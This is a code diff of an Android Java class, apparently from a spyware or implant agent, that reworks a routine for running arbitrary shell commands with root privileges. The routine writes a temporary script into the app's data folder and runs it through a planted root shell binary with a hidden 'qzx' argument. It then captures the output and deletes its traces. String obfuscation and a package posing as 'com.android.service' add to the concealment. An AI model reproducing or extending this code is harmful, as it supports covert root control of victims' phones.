@@ -150,37 +150,47 @@ public class Execute {
 		}
 	}
 
-	public synchronized static String executeScript(String cmd) {
+	public synchronized static ExecuteResult executeScript(String cmd) {
 		String pack = Status.self().getAppContext().getPackageName();
 
 		String script = M.e("#!/system/bin/sh") + "\n" + String.format(M.e("%s | tee /data/data/%s/files/o"), cmd, pack)
 				+ "\n";
+		
+		ExecuteResult result = new ExecuteResult(cmd);
 
 		if (Root.createScript("e", script) == true) {
-			// 32_7=/system/bin/chmod 755
-			// su -c /data/data/com.android.service/files/s
-			// TODO: su root /data/data/com.android.service/files/s
-			boolean res = Execute.executeWaitFor(String.format(M.e("su -c /data/data/%s/files/s"), pack));
+			boolean res = Execute.executeWaitFor(String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (superapkRoot) execute 2: " + String.format(M.e("su -c /data/data/%s/files/s"), pack)
+				Check.log(TAG + " (execute) execute 2: " + String.format(M.e("%s qzx /data/data/%s/files/e"), Configuration.shellFile, pack)
 						+ " ret: " + res);
 			}
 
-			Root.removeScript("s");
+			Root.removeScript("e");
 			AutoFile file = new AutoFile(String.format(M.e("/data/data/%s/files/o"), pack));
-			String ret = new String(file.read());
+			byte[] buffer = file.read();
+			if(buffer!=null){
+				String ret = new String(buffer);
+				for(String l: ret.split("\n")){
+					result.stdout.add(l + "\n");
+				}
+				if(res){
+					result.exitCode = 0;
+				}
+			}
+			
 			file.delete();
-			return ret;
+			
 
 		} else {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " ERROR: (superapkRoot), cannot create script");
+				Check.log(TAG + " ERROR: (execute), cannot create script");
 			}
 		}
 
-		return "";
+		return result;
 
 	}
+
 
 }
